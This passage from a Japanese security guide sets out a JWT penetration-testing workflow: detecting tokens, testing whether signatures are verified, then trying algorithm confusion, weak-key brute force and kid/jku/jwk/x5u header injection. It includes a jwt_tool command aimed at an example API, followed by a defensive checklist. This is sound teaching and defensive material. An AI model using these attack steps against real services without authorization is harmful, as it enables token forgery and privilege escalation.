1. **トークンの発見**: リクエスト/レスポンス中からJWTらしき文字列を正規表現で検出する: `[= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*`
2. **スコープの確認**: 認可に使われているトークンかどうかを、ヘッダ/Cookieを1つずつ外して挙動を見ることで切り分ける。
3. **デコードと棚卸し**: `alg`、`exp`、権限に関わるクレーム（`role`、`id`など）を確認する。
4. **署名検証の有無テスト**: 署名の1バイトを変更して送信し、受理されれば検証未実装が疑われる。
5. **系統的な攻撃試行**: アルゴリズム混同 → 弱鍵ブルートフォース → ヘッダインジェクション（`kid`/`jku`/`jwk`/`x5u`）の順に試す。
6. **影響評価**: 成功した攻撃を、権限昇格やデータアクセスにどう連鎖させられるかを検証し、文書化する。

**自動化ツール（総合）**:

```bash

python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/user/ID" \
  -rh "Authorization: Bearer <TOKEN>"
```

### 11. 防御のまとめ（チェックリスト）

本節で紹介したすべての攻撃に共通する防御原則を、実装チェックリストとして整理する。防御目的での参照を前提とし、実サービスへの無許可の検証は行わないこと。

- [ ] **アルゴリズムをサーバー側で固定**し、トークンヘッダの`alg`値によって検証方式を切り替えない（`none`を明示的に拒否し、RS256運用時はHS256を許可しない）
- [ ] **署名鍵は十分なエントロピー**（HMACなら最低256ビット相当）を持つランダム値とし、デフォルト値・推測可能な値を使わない
- [ ] **`kid`はホワイトリスト照合**で扱い、ファイルパス・SQLクエリ・シェルコマンドへ直接連結しない
- [ ] **`jku`/`x5u`は動的取得を無効化**するか、許可ホストのホワイトリストで厳格に制限する
- [ ] **`jwk`（埋め込み鍵）をヘッダから検証に使わない**。検証鍵は常にサーバー側の鍵ストアを参照する
- [ ] **`x5c`の証明書チェーンを信頼済みルートまで検証**し、自己署名証明書を無条件に信用しない
- [ ] **`exp`/`nbf`/`iss`/`aud`を厳密に検証**し、`jti`によるトークン失効・リプレイ対策を実装する
- [ ] **エラーメッセージに署名値や内部情報を含めない**（署名比較の失敗時に「期待値」を返さない）
- [ ] **署名検証失敗をログに記録**し、異常なアルゴリズム変更やヘッダ改ざんの試行を監視する
